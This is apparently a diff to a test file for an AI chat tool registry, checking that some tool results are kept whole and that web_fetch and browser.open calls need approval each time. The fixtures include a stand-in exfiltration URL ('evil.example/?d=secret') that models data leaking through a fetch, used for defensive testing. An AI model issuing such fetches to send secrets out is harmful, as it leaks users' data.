@@ -128,6 +128,19 @@ describe('tool registry', () => {
     expect(result.event.preview).toBe(`${'a'.repeat(1500)}…`)
   })
 
+  it("keeps results a provider needs whole (a skill's instructions) out of a round's share", async () => {
+    register(
+      fake('whole', ['guide'], {
+        wholeResults: true,
+        run: async () => ({ content: 'g'.repeat(30_000), event: { tool: 'guide', args: {}, ok: true, summary: 'guide' } })
+      })
+    )
+    const result = await runTool(call('guide'), ctx({ maxResultChars: 1_500 }))
+    expect(result.content.startsWith(`${'g'.repeat(24_000)}\n[…`)).toBe(true)
+    const skill = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true, maxResultChars: 10 }))
+    expect(skill.content).toContain('Fill the form with scripts/fill.py.')
+  })
+
   it("caps a result at the call's share of the room when the reply gives one, never above the usual cap", async () => {
     register(
       fake('big', ['dump'], {
@@ -230,13 +243,13 @@ describe('asking first', () => {
     expect(approvalFor(call('run_code'), ctx())).toBe('ask')
   })
 
-  it('asks before web_fetch once the chat has other tool sources, with the answer covering one site', () => {
+  it('asks before every web_fetch once the chat has other tool sources, a denial covering the site', () => {
     const c = ctx({ web: true, sources: ['code-runner'] }) // any source; MCP ones are covered in mcp.test.ts
-    expect(approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('ask')
+    expect(approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('ask-every-time')
     expect(approvalFor(call('web_search', { query: 'x' }), c)).toBe('auto')
     expect(allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('web_fetch@evil.example')
     // gpt-oss's browser.open is the same fetch, and asks the same way.
-    expect(approvalFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('ask')
+    expect(approvalFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('ask-every-time')
     expect(allowKeyFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('web_fetch@evil.example')
     expect(allowKeyFor(call('web_search', { query: 'x' }), c)).toBe('web_search')
   })
